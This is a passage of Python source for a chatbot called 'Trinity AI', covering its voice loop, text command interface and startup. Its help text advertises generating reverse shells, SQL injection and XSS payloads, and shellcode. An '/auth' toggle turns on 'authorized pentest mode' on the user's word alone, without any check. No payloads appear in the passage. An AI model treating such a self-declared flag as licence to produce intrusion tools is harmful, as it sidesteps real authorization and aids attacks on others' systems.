        
        text = self.voice.listen(timeout=8.0)
        
        if not text:
            self.voice.speak("I didn't catch that. Could you repeat?")
            return
        
        print(f"\n[User]: {text}")
        print("[Trinity AI]: Thinking...\n")
        
        response = self.process_query(text)
        
        print(f"[Trinity AI]: {response.content[:200]}...")
        
        # Speak response
        self.voice.speak(response.content[:500])  # Limit to first 500 chars for speech
    
    def voice_conversation_loop(self) -> None:
        """Continuous voice conversation."""
        if not self.voice or not self.voice.enabled:
            print("[Voice] Not available. Run with --voice flag after installing dependencies.")
            return
        
        self.voice.speak("Hello! I am Trinity AI. I'm ready to help.")
        
        try:
            while self.running:
                self.listen_and_respond()
                
                # Ask if user wants to continue
                self.voice.speak("Would you like to ask something else?")
                more = self.voice.listen(timeout=5.0)
                
                if more and any(w in more.lower() for w in ["no", "bye", "exit", "quit", "stop"]):
                    self.voice.speak("Goodbye! Thanks for chatting with Trinity AI.")
                    break
                elif not more:
                    break
        
        except KeyboardInterrupt:
            self.voice.speak("Goodbye!")
        finally:
            self.running = False

# ============================================================
# TEXT INTERFACE
# ============================================================

def text_interface(ai: TrinityAI):
    """Interactive text-based chat interface."""
    
    print(r"""
╔══════════════════════════════════════════════════╗
║              TRINITY AI v1.0                     ║
║     HackerAI + DeepSeek + Claude Hybrid          ║
║                                                  ║
║  Commands:                                       ║
║  /voice    - Voice mode (if available)           ║
║  /auth     - Toggle authorized pentest mode      ║
║  /history  - Show conversation history           ║
║  /summary  - Show session summary                ║
║  /clear    - Clear conversation                  ║
║  /session  - Show session ID                     ║
║  /help     - Show domain help                    ║
║  /exit     - Exit                                ║
╚══════════════════════════════════════════════════╝
""")
    
    print(f"Session ID: {ai.session_id}\n")
    
    while ai.running:
        try:
            user_input = input("You: ").strip()
            
            if not user_input:
                continue
            
            # Check for commands
            if user_input.startswith("/"):
                cmd = user_input.lower()
                
                if cmd in ("/exit", "/quit"):
                    print("\nTrinity AI: Goodbye!\n")
                    ai.running = False
                    break
                
                elif cmd == "/voice":
                    if ai.voice and ai.voice.enabled:
                        print("\nTrinity AI: Entering voice mode. Speak when prompted.")
                        ai.voice_conversation_loop()
                    else:
                        print("\nTrinity AI: Voice not available. Install speechrecognition, pyttsx3, pyaudio")
                    print("\nBack to text mode.\n")
                    continue
                
                elif cmd == "/auth":
                    ai.auth_pentest = not ai.auth_pentest
                    print(f"\nTrinity AI: Authorized pentest mode: {'ON' if ai.auth_pentest else 'OFF'}")
                    continue
                
                elif cmd == "/history":
                    ctx = ai.memory.get_context(ai.session_id, 50)
                    print(f"\n{'='*40}")
                    print(f"Conversation History ({len(ctx)} messages):")
                    print(f"{'='*40}")
                    for msg in ctx:
                        prefix = "You" if msg.role == "user" else "Trinity"
                        print(f"\n{prefix}: {msg.content[:100]}...")
                        print(f"    [{msg.timestamp}]")
                    print(f"\n{'='*40}\n")
                    continue
                
                elif cmd == "/summary":
                    print(f"\n{ai.memory.get_summary(ai.session_id)}\n")
                    continue
                
                elif cmd == "/clear":
                    ai.memory.clear_session(ai.session_id)
                    print("\nTrinity AI: Conversation cleared.\n")
                    continue
                
                elif cmd == "/session":
                    print(f"\nSession ID: {ai.session_id}\n")
                    continue
                
                elif cmd == "/help":
                    print("""
Available Domains:
  🔒 Security (HackerAI):
     - Generate reverse shells (Python, Bash, PowerShell)
     - SQL injection payloads (MySQL, MSSQL, PostgreSQL)
     - XSS payloads (reflected, stored, DOM)
     - Port scanning / enumeration
     - CVE / vulnerability analysis
     - Shellcode generation

  🧮 Math & Logic (DeepSeek):
     - Derivatives, integrals, limits
     - Equation solving, factorization
     - Code optimization
     - Logical reasoning
     - Algorithm analysis

  💬 Conversation (Claude):
     - Ethical analysis
     - Document summarization
     - General conversation
     - Advice & perspective

  🎤 Voice: Say "/voice" to enable speech interaction
                    """)
                    continue
                
                else:
                    print(f"\nTrinity AI: Unknown command: {cmd}. Try /help\n")
                    continue
            
            # Process normal query
            print("\nTrinity AI: Thinking...")
            response = ai.process_query(user_input)
            
            print(f"\nTrinity AI [{response.domain}]:")
            print(response.content)
            
            # Show metadata briefly
            meta = response.metadata.get("classification", {})
            if meta:
                print(f"\n[Routing: {meta.get('primary')} "
                      f"({(meta.get('confidence', 0)*100):.0f}%)"
                      f"{' + Cross-consult' if meta.get('secondary') else ''}]")
            print()
        
        except KeyboardInterrupt:
            print("\n\nTrinity AI: Goodbye!\n")
            ai.running = False
            break
        except EOFError:
            print()
            break
        except Exception as e:
            print(f"\n[Error]: {e}\n")

# ============================================================
# MAIN
# ============================================================

def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description="Trinity AI - Hybrid HackerAI + DeepSeek + Claude"
    )
    parser.add_argument("--voice", action="store_true",
                        help="Start in voice mode")
    parser.add_argument("--no-voice", action="store_true",
                        help="Disable voice entirely")
    parser.add_argument("--auth", action="store_true",
                        help="Enable authorized pentest mode")
    
    args = parser.parse_args()
    
    enable_voice = args.voice and not args.no_voice
    ai = TrinityAI(enable_voice=enable_voice)
    
    if args.auth:
        ai.auth_pentest = True
        print("[+] Authorized pentest mode enabled")
    
    if enable_voice and ai.voice and ai.voice.enabled:
        ai.voice_conversation_loop()
    else:
        text_interface(ai)

if __name__ == "__main__":
    main()
